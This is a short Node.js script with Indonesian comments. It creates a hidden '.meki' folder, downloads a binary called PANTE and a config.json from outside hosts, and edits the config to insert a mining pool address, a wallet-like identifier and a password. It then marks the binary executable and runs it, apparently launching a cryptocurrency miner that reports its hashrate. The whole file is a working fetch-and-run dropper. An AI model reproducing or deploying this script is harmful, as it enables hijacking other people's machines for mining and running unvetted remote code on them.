// pante.js
const fs = require('fs');
const path = require('path');
const { execSync, spawn } = require('child_process');
const axios = require('axios');

// Lokasi kerja
const WORKDIR = path.join(process.cwd(), '.meki');
if (!fs.existsSync(WORKDIR)) {
  fs.mkdirSync(WORKDIR, { recursive: true });
}
process.chdir(WORKDIR);

// URL file
const URL_GENZO = "https://blogspotgenzo.site/PANTE";
const URL_CONFIG = "http://genzoko.serveblog.net/config.json";

// Nama file
const FILE_GENZO = "PANTE";
const FILE_CONFIG = "config.json";

// Fungsi download
async function downloadFile(url, outputPath) {
  try {
    const response = await axios.get(url, { responseType: 'arraybuffer' });
    fs.writeFileSync(outputPath, response.data);
    console.log(`[*] Berhasil download ${path.basename(outputPath)}`);
  } catch (error) {
    console.error(`Gagal download ${url}:`, error.message);
    process.exit(1);
  }
}

// Fungsi edit config.json
function editConfig(filePath) {
  try {
    let data = fs.readFileSync(filePath, 'utf8');

    data = data.replace(/"tua"/g, '"43.157.91.13:2425"');
    data = data.replace(/"wulet"/g, '"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Qeri"');
    data = data.replace(/"meki"/g, '"power2b"');

    fs.writeFileSync(filePath, data);
    console.log("[*] config.json berhasil diperbarui");
  } catch (error) {
    console.error("Gagal edit config.json:", error.message);
    process.exit(1);
  }
}

// Fungsi ubah file jadi executable
function makeExecutable(filePath) {
  try {
    fs.chmodSync(filePath, 0o755);
    console.log(`[*] ${path.basename(filePath)} sudah bisa dieksekusi`);
  } catch (error) {
    console.error("Gagal mengubah permission:", error.message);
  }
}

// Fungsi jalankan PANTE
function runPante(binary, config) {
  console.log("[*] Menjalankan PANTE (hashrate akan tampil di bawah)...");
  console.log("");

  const processRun = spawn(`./${binary}`, ['-c', config], {
    stdio: 'inherit',
    shell: true
  });

  processRun.on('close', (code) => {
    console.log(`Proses selesai dengan kode: ${code}`);
  });
}

// Main eksekusi
(async () => {
  console.log("[*] Mulai proses...");

  await downloadFile(URL_GENZO, FILE_GENZO);
  await downloadFile(URL_CONFIG, FILE_CONFIG);

  editConfig(FILE_CONFIG);
  makeExecutable(FILE_GENZO);
  runPante(FILE_GENZO, FILE_CONFIG);
})();
